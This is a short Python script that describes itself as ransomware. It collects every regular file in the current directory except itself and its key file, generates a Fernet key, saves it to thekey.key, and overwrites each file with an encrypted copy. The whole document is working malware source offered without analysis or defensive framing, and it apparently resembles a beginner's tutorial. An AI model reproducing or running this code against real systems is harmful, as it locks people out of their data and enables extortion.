#! /bin/python3 

# This is ransomeware 

import os 
from cryptography.fernet import Fernet 

# Find files 

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" :
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

# making key

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)

# opening the files 

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	# locking the files 
	contents_encrypted = Fernet(key).encrypt(contents)
	# write back file as encrypted
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
	
